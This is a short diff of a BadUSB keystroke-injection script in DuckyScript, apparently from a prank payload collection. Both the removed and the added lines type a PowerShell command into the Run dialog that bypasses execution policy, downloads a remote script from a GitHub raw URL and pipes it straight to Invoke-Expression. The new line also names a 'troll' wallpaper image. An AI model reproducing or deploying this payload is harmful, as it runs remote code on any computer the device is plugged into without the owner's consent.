@@ -15,6 +15,6 @@ REM     ------------------------------------------------------------------------
 REM
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass iwr https://raw.githubusercontent.com/Albertogon/pwned/main/badusb-collection/wallpaper/Wallpaper.ps1 | iex
+STRING powershell -noexit -NoP -NonI -Exec Bypass $url='raw.githubusercontent.com/Albertogon/pwned/main/badusb-collection/wallpaper/wp-troll.png'; iwr https://raw.githubusercontent.com/Albertogon/pwned/main/badusb-collection/wallpaper/Wallpaper.ps1?dl=1 | iex
 DELAY 500
 ENTER
